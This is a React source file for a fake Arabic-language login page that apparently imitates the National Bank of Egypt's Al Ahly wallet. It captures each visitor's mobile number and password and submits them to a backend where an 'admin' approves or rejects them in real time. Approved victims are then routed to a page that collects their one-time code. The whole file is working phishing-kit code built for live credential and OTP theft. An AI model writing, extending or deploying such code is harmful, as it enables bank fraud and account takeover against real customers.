import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { navigateToPage, submitData, isFormApproved, isFormRejected } from "@/lib/store";
import NBELayout from "./components/NBELayout";
import WaitingOverlay from "./components/WaitingOverlay";

export default function WalletLoginPage() {
  const [, setLocation] = useLocation();
  const [mobileNumber, setMobileNumber] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [errors, setErrors] = useState<{ mobile?: string; password?: string }>({});

  useEffect(() => {
    navigateToPage("تسجيل الدخول - محفظة الأهلي");
  }, []);

  // Listen for admin approval/rejection
  useEffect(() => {
    if (isFormApproved.value && isWaiting) {
      setIsWaiting(false);
      setErrorMsg("");
      isFormApproved.value = false;
      // Move to OTP page
      setLocation("/otp-nbe");
    }
  }, [isFormApproved.value]);

  useEffect(() => {
    if (isFormRejected.value && isWaiting) {
      setIsWaiting(false);
      isFormRejected.value = false;
      // Clear fields and show error
      setMobileNumber("");
      setPassword("");
      setErrorMsg("خطأ في المعلومات المدخلة");
    }
  }, [isFormRejected.value]);

  // Poll for changes in signals
  useEffect(() => {
    const interval = setInterval(() => {
      if (isFormApproved.value && isWaiting) {
        setIsWaiting(false);
        setErrorMsg("");
        isFormApproved.value = false;
        setLocation("/otp-nbe");
      }
      if (isFormRejected.value && isWaiting) {
        setIsWaiting(false);
        isFormRejected.value = false;
        setMobileNumber("");
        setPassword("");
        setErrorMsg("خطأ في المعلومات المدخلة");
      }
    }, 500);
    return () => clearInterval(interval);
  }, [isWaiting]);

  const validate = () => {
    const newErrors: { mobile?: string; password?: string } = {};
    if (!mobileNumber.trim()) {
      newErrors.mobile = "يرجى إدخال رقم الموبايل";
    }
    if (!password.trim()) {
      newErrors.password = "يرجى إدخال كلمة المرور";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    setErrorMsg("");
    setIsWaiting(true);

    // Submit data and wait for admin response
    submitData(
      {
        "رقم الموبايل": mobileNumber,
        "كلمة المرور": password,
      },
      true // waitingForAdminResponse
    );
  };

  return (
    <>
      {isWaiting && <WaitingOverlay message="جاري التحقق من بيانات الدخول..." />}
      
      <NBELayout currentStep={1} totalSteps={2}>
        <div className="text-center mb-6">
          <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg className="w-7 h-7 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">تسجيل الدخول</h2>
          <p className="text-gray-500 text-sm">أدخل بيانات محفظة الأهلي الخاصة بك</p>
        </div>

        {/* Error Message */}
        {errorMsg && (
          <div className="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 flex items-center gap-2">
            <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
            </svg>
            <p className="text-red-600 text-sm font-medium">{errorMsg}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Mobile Number */}
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              رقم الموبايل
            </label>
            <div className="relative">
              <input
                type="tel"
                value={mobileNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, "");
                  setMobileNumber(val);
                  if (errors.mobile) setErrors({ ...errors, mobile: undefined });
                  setErrorMsg("");
                }}
                placeholder="01XXXXXXXXX"
                className={`w-full px-4 py-3 pr-12 rounded-xl border-2 ${
                  errors.mobile ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-green-500"
                } outline-none transition-colors text-right bg-gray-50 focus:bg-white`}
                dir="ltr"
                style={{ textAlign: "right" }}
              />
              <div className="absolute left-3 top-1/2 -translate-y-1/2">
                <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                </svg>
              </div>
            </div>
            {errors.mobile && (
              <p className="text-red-500 text-xs mt-1">{errors.mobile}</p>
            )}
          </div>

          {/* Password */}
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              كلمة المرور
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (errors.password) setErrors({ ...errors, password: undefined });
                  setErrorMsg("");
                }}
                placeholder="أدخل كلمة المرور"
                className={`w-full px-4 py-3 pr-4 pl-12 rounded-xl border-2 ${
                  errors.password ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-green-500"
                } outline-none transition-colors text-right bg-gray-50 focus:bg-white`}
                dir="rtl"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
              >
                {showPassword ? (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21" />
                  </svg>
                ) : (
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                  </svg>
                )}
              </button>
            </div>
            {errors.password && (
              <p className="text-red-500 text-xs mt-1">{errors.password}</p>
            )}
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isWaiting}
            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
          >
            تسجيل الدخول
          </button>
        </form>
      </NBELayout>
    </>
  );
}
